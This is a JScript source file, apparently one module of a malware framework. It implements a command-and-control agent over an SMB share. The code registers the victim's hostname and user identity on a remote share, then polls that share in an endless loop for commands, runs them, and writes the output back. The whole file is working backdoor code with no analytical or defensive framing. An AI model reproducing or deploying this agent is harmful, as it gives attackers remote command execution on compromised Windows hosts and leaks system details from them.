// chunk: c2/smb_pipe
// depends: core/run_cmd, core/emit_buffer, core/file_ops
// provides: c2_smb
// format: jscript

function c2_smb(server, shareName, interval) {
    var basePath = "\\\\" + server + "\\" + shareName;
    var agentId = Math.floor(Math.random() * 999999);
    var cmdFile = basePath + "\\cmd_" + agentId + ".txt";
    var resFile = basePath + "\\res_" + agentId + ".txt";
    var regData = _run("hostname") + "|" + _run("whoami") + "|" + agentId;
    try {
        var f = _fso.CreateTextFile(basePath + "\\reg_" + agentId + ".txt", true);
        f.Write(regData.replace(/[\r\n]/g, ""));
        f.Close();
    } catch(e) { return; }
    while (true) {
        WScript.Sleep(interval);
        try {
            if (_fso.FileExists(cmdFile)) {
                var cmd = read_file(cmdFile, 4096).replace(/[\r\n]/g, "");
                _fso.DeleteFile(cmdFile);
                if (cmd == "exit") break;
                var out = _run(cmd);
                var rf = _fso.CreateTextFile(resFile, true);
                rf.Write(out);
                rf.Close();
            }
        } catch(e) {
            WScript.Sleep(interval * 2);
        }
    }
}
